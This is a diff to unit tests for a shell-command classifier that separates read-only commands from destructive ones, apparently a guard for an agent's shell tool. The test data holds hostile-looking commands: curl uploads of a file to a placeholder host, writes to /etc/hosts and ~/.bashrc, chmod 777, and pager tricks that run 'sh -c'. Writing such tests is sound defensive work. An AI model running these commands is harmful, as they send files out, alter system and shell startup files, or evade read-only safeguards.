@@ -85,6 +85,13 @@ describe('readonly: the allow-list', () => {
     ['a substitution program word', '$(echo ls) -la'],
     ['tee to a file', 'echo x | tee out.txt'],
     ['npm install', 'npm install'],
+    ['a `>&` redirect to a file', 'ls >&out.txt'],
+    ['sed -n with a script file', 'sed -n -f script.sed x'],
+    ['tree -o inside a flag group', 'tree -ao listing.txt'],
+    ['file -C compiles a magic file', 'file -C -m magic'],
+    ['git grep -O runs a pager program', 'git grep -O"sh -c x" foo'],
+    ['git grep --open-files-in-pager', 'git grep --open-files-in-pager=vim foo'],
+    ['git -p forces the pager', 'git -p log'],
   ])('not readonly: %s', (_why, command) => {
     expect(kindOf(command)).not.toBe('readonly');
   });
@@ -177,6 +184,7 @@ describe('destructive rules', () => {
     ['exfiltrate', 'curl -T a.txt ftp://x'],
     ['exfiltrate', 'curl --upload-file a.txt https://x'],
     ['outside_write', 'echo x > /etc/hosts'],
+    ['outside_write', 'echo x >& ~/.bashrc'],
     ['outside_write', 'echo x >> ~/.bashrc'],
     ['outside_write', 'echo x | tee /usr/local/x'],
     ['outside_write', 'chmod -R 777 /opt/app'],
